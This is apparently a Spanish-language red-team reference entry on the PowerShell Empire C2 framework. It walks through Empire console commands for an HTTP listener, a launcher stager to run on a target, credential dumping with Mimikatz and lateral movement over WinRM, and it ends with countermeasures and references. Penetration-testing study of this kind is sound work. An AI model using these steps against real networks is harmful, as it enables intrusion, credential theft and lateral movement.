---
title: "PowerShell Empire: Post-Explotación y C2"
slug: empire-framework
aliases: [PowerShell Empire, Empire, C2 framework, Starkiller]
fase: [Post-Explotación]
plataforma: Multi
dificultad: Intermedia
mitre: [T1059.001, T1548.002, T1021.006]
related: []
learning_refs: []
---

# PowerShell Empire: Post-Explotación y C2

## Descripción
PowerShell Empire es un framework de comando y control (C2) de post-explotación basado inicialmente en agentes PowerShell (Windows) y ampliado a Python (Linux/macOS). Es altamente eficaz para el movimiento lateral, la escalada de privilegios y la persistencia en redes corporativas, permitiendo la ejecución de agentes en memoria sin tocar el disco. Su integración con herramientas como Mimikatz y BloodHound lo convierte en una plataforma central para operaciones de Red Team.

## Herramientas
- **Server/Client (Empire)** — Arquitectura cliente-servidor para la gestión de agentes.
- **Listeners** — Puntos de escucha (HTTP, HTTPS, OneDrive) para las comunicaciones entrantes de los agentes.
- **Stagers** — Fragmentos de código que se ejecutan en el host objetivo para descargar e iniciar el agente completo.
- **Agents** — El software malicioso que reside en la memoria del objetivo y ejecuta comandos remotos.
- **Módulos** — Scripts de post-explotación para enumeración, elevación de privilegios y persistencia.

## Comandos / Ejemplos

### Configuración del Listener
El primer paso para recibir conexiones de agentes remotos.
```bash
# Iniciar el servidor Empire y el cliente
sudo empire server
./empire client

# Crear un listener HTTP básico
(Empire) > uselistener http
(Empire: uselistener/http) > set Name MyListener
(Empire: uselistener/http) > set Host 10.10.14.5
(Empire: uselistener/http) > set Port 8080
(Empire: uselistener/http) > execute
```

### Generación del Stager
El payload que infectará al host objetivo.
```bash
# Crear un stager multi/launcher (línea de comandos)
(Empire) > usestager multi/launcher
(Empire: usestager/multi/launcher) > set Listener MyListener
(Empire: usestager/multi/launcher) > execute
# Copiar el comando PowerShell resultante y ejecutarlo en el objetivo.
```

### Gestión de Agentes y Ejecución de Módulos
Una vez que el agente se conecta, podemos interactuar con él.
```bash
# Listar agentes activos e interactuar con uno
(Empire) > agents
(Empire) > interact <AgentName>

# Usar el módulo de Sherlock para buscar fallos de escalada de privilegios
(Empire: <AgentName>) > usemodule powershell/privesc/sherlock
(Empire: powershell/privesc/sherlock) > execute

# Inyectar Mimikatz para volcar credenciales
(Empire: <AgentName>) > usemodule powershell/credentials/mimikatz/logonpasswords
(Empire: powershell/credentials/mimikatz/logonpasswords) > execute
```

### Movimiento Lateral con WinRM
```bash
# Moverse lateralmente a otra máquina usando credenciales comprometidas
(Empire: <AgentName>) > usemodule powershell/lateral_movement/invoke_psremoting
(Empire: powershell/lateral_movement/invoke_psremoting) > set ComputerName TargetPC
(Empire: powershell/lateral_movement/invoke_psremoting) > execute
```

## Contramedidas
- Habilitar el registro detallado de PowerShell (Script Block Logging) para auditar comandos inyectados en memoria.
- Implementar AppLocker o Windows Defender Application Control (WDAC) para bloquear la ejecución de scripts PowerShell no firmados.
- Monitorizar el tráfico de red en busca de balizas (beacons) y conexiones HTTP/S a dominios no autorizados.

## Referencias
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- BC Security. (s.f.). *Empire* [Software]. GitHub. https://github.com/BC-SECURITY/Empire
- MITRE Corporation. (2024). ATT&CK Technique T1059.001: PowerShell. https://attack.mitre.org/techniques/T1059/001/
